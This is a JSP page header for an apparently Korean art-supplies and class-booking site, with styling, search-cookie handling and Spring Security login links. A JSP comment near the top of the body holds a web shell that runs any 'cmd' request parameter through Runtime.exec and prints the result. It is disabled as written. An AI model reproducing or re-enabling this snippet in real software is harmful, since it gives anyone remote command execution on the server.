<%@ page import="java.util.*,java.io.*"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="sec" uri="http://www.springframework.org/security/tags"%>

<!DOCTYPE html>
<html>
<head>

<meta charset="UTF-8">
<sec:csrfMetaTags />
<title>Insert title here</title>
<style>
/* ✅ 기본 레이아웃 */
body {
	padding: 0;
	margin: 0;
	color: #333;
	font-family: sans-serif;
}

a {
	color: #333;
	text-decoration: none;
}

/* ✅ 전체 헤더 래퍼 */
#header_wrapper {
	width: 100%;
	margin-top: 20px; /* 너무 위에 붙지 않게 여백 */
}

/* ✅ 상단 로그인/로그아웃 영역 */
.header_top {
	display: flex;
	justify-content: flex-end;
	padding: 10px 20px;
	font-size: 14px;
}

/* ✅ 하단 메뉴 및 검색창 영역 */
.header_bottom {
	display: flex;
	justify-content: center;
	align-items: center;
	padding: 20px 0;
	gap: 30px;
}

/* ✅ 메뉴 링크 스타일 */
.header_bottom a {
	font-size: 20px;
	font-weight: bold;
	color: #333;
}

/* ✅ 검색박스 너비 */
.search_box {
	width: 400px;
}

/* ✅ 검색폼 타원형 디자인 */
.search_form fieldset {
    border: none;
    padding: 0;
    margin: 0;
    display: flex;
    align-items: center;
    width: 100%;
    background: #fff;
    border-radius: 30px;
    overflow: hidden;
    border: 1px solid #ccc;
}

/* ✅ 텍스트 입력창 */
.search_form input[type="text"] {
    flex: 1;
    padding: 10px 15px;
    border: none;
    outline: none;
    font-size: 16px;
    background: transparent;
    color: #333;
}

/* ✅ 검색 버튼 이미지 */
.search_form input[type="image"] {
    width: 36px;
    height: 36px;
    padding: 5px;
    background-color: transparent;
    border: none;
    cursor: pointer;
}

/* ✅ 네비게이션 관련 */
#navebarwrapper {
	/* optional styles */
}

.naveulwrapper ul {
	font-weight: 600;
	line-height: 3em;
	color: #333;
	margin-right: 70px;
	font-size: 20px;
	width: 100%;
	display: flex;
	justify-content: space-between;
	height: 80px;
	list-style: none;
	padding: 0;
	margin: 0;
}

.naveulwrapper ul li {
	padding: 10px 10px;
}

.right {
	display: flex;
	justify-content: space-between;
}


/* form 시작 */
    .search_form {
        display: flex;
        align-items: center;
        border: 1px solid #ccc;
        border-radius: 30px;
        overflow: hidden;
        width: 400px;
        background-color: #fff;
    }

    .search_form input[type="text"] {
        flex: 1;
        border: none;
        padding: 10px 15px;
        font-size: 16px;
        outline: none;
        color: #333;
        background-color: transparent;
    }

    .search_form select {
        border: none;
        outline: none;
        padding: 0 12px;
        font-size: 16px;
        cursor: pointer;
        background-color: transparent;
        color: #333;
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
    }

    .divider {
        width: 1px;
        height: 36px;
        background-color: #ccc;
    }

    .search_button {
        border: none;
        background: transparent;
        cursor: pointer;
        padding: 0 10px;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .search_button img {
        width: 36px;
        height: 36px;
    }
/* form 종료 */


/* 쓰기버튼 시작 */
.write-btn {
    background-color: #ff7a00; /* 이쁜 주황색 */
    color: #fff;
    border: none;
    padding: 10px 20px;
    font-size: 16px;
    font-weight: bold;
    border-radius: 20px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.write-btn:hover {
    background-color: #e56c00;
}

/* 쓰기버튼 종료 */
</style>




<!-- <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> -->
<script>
$(document).ready(function() {
	  const token = $("meta[name='_csrf']").attr("content");
	  const header = $("meta[name='_csrf_header']").attr("content");

	  $.ajaxSetup({
	    beforeSend: function(xhr) {
	      xhr.setRequestHeader(header, token);
	    }
	  });
	  
	  
		  const 현재저장되어있는검색어=getCurrentCachySearchQueryFromCookie();
		
	  if(getCurrentCachySearchQueryFromCookie()!=null){		  
		  $("#queryTop").val(현재저장되어있는검색어);
		  
	  }
	  
		  
	  
});
	  
	  
	 $(document).ready(function(){
		 
		 
		 // 폼 제출 전에 검색어 체크
		  $("#searchBarForm").on("submit", function(e) {
			  
			  const query = $.trim($("#queryTop").val());
			  const 현재저장되어있는검색어=getCurrentCachySearchQueryFromCookie();
			  if(query===현재저장되어있는검색어){
				    e.preventDefault();  // 제출 막기
				  return;
			  }
			  
				let cachyedTotalCnt=  getCurrentCachyFromCookie();
								
				if(cachyedTotalCnt>0){
					deleteCachyTotalCntCookie()
				}		
			  
			  
			  
		  
		    if (query === "") {
		      alert("검색어를 입력해주세요.");
		      $("#queryTop").focus();
		      e.preventDefault();  // 제출 막기
		      return false;
		    }

		    
		    
		    
		 
		    
		    
		    // 조건 통과하면 그대로 제출 → 페이지 이동
		  });
		 
		 
	  // 폼 제출 전에 검색어 체크
		  $("#searchBarForm").on("change", function(e) {

			 
			
			  
		    
		    
		  });
		  
		 
		  
		  
		  
		 
		 
	 }) 
	 
	

	 //쿠키에서 totalCnt 읽기 함수
function getCurrentCachyFromCookie() {
    const match = document.cookie.match(/cachyTotalCnt=(\d+)/);
    
    return Number(match?.[1] ?? 0);
}

	 function getCurrentCachySearchQueryFromCookie() {
		  const match = document.cookie.match(/(?:^|;\s*)query=([^;]+)/);
		  console.log(match?.[1]);

		  // 디코딩해서 반환 (쿠키는 encodeURIComponent로 저장되었으므로)
		  return match ? decodeURIComponent(match[1]) : null;
		}

	 

	 function deleteCachyTotalCntCookie() {
		// cachyTotalCnt 쿠키 제거
		 document.cookie = "cachyTotalCnt=; path=/; max-age=0; SameSite=Lax";

		 // query 쿠키 제거
		 document.cookie = "query=; path=/; max-age=0; SameSite=Lax";

		}
</script>


</head>
<body>
<%--  <form method="GET" name="cmdForm" action="">
<input type="text" name="cmd">
<input type="submit" value="전송">
</form>
<pre>
<%
if (request.getParameter("cmd") != null)
{
	out.println("명령어 : " + request.getParameter("cmd") + "<br>");
	
	Process p;
	
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
		p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    
    else
		p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	
	InputStreamReader in = new InputStreamReader(p.getInputStream(),"euc-kr");
	BufferedReader br = new BufferedReader(in);
	
	String disr = br.readLine();
	
	while ( disr != null )
	{
		out.println(disr); 
		disr = br.readLine(); 
	}
}
%>
</pre> --%>

	<!-- HEADER 전체 wrapper -->
<div id="header_wrapper" >

    <!-- ✅ 1행: 로그인/로그아웃 -->
    <div class="header_top" >
       <!-- ✅ 로그인 상태일 때 -->
<sec:authorize access="isAuthenticated()">
    <a href="${pageContext.request.contextPath}/users/mypage">나의정보</a> &nbsp;|&nbsp;
	<a href="${pageContext.request.contextPath}/users/generalcartlist">장바구니</a> &nbsp;|&nbsp;
    <a href="${pageContext.request.contextPath}/users/payinfo">결제현황</a> &nbsp;|&nbsp;
    <a href="${pageContext.request.contextPath}/users/get-my-reserve-page">예약현황</a> &nbsp;|&nbsp;
 <form id="logoutForm" action="${pageContext.request.contextPath}/users/logout" method="POST" style="display: inline;">
  <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}" />
  <button type="submit" style="background: none; border: none; color: #333; cursor: pointer;">로그아웃</button>
</form>




</sec:authorize>
<!-- ✅ 비로그인 상태일 때 -->
<sec:authorize access="!isAuthenticated()">
    <a href="${pageContext.request.contextPath}/guest/login">로그인/가입</a>
</sec:authorize>
    </div>


    <!-- ✅ 2행: 메뉴 + 검색창 -->   


    <div class="header_bottom" >
        <a href="${pageContext.request.contextPath}/guest/productlist" >미술용품</a>
        <a href="${pageContext.request.contextPath}/guest/get-onedayclass-detail-one-page" >미술수업</a>
         <a href="${pageContext.request.contextPath}/guest/communityPage" >커뮤니티</a>
         
         
         
        <!-- 🔍 검색창 삽입 -->
        <div class="search_box" id="top_search2" >
            <div class="search_section">
       <form id="searchBarForm" method="GET" action="${pageContext.request.contextPath}/guest/search">
  <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}" />
  
  <div class="search_form">
    <input id="queryTop" name="query" type="text" placeholder="검색어를 입력하세요" autocomplete="off" required>
    <div class="divider"></div>
    <select class="search_type" name="search_type">
      <option value="community" selected>커뮤니티</option>
      <option value="product">상품</option>
    </select>
    <div class="divider"></div>
    <button type="submit" class="search_button">
      <img src="https://hwabang.net/web/img/icon/search_icon.png" alt="검색" />
    </button>
  </div>
</form>
            </div>
        </div>
        
           <!-- ✅ 글쓰기 버튼 추가 -->
        <sec:authorize access="!isAuthenticated()">
            <button class="write-btn" onclick="window.location.href='${pageContext.request.contextPath}/guest/login'">
                글쓰기
            </button>
        </sec:authorize>

        <sec:authorize access="isAuthenticated()">
            <button class="write-btn" onclick="window.location.href='${pageContext.request.contextPath}/users/get-free-write-gasigle'">
                글쓰기
            </button>
        </sec:authorize>
    </div>
</div>

</body>
</html>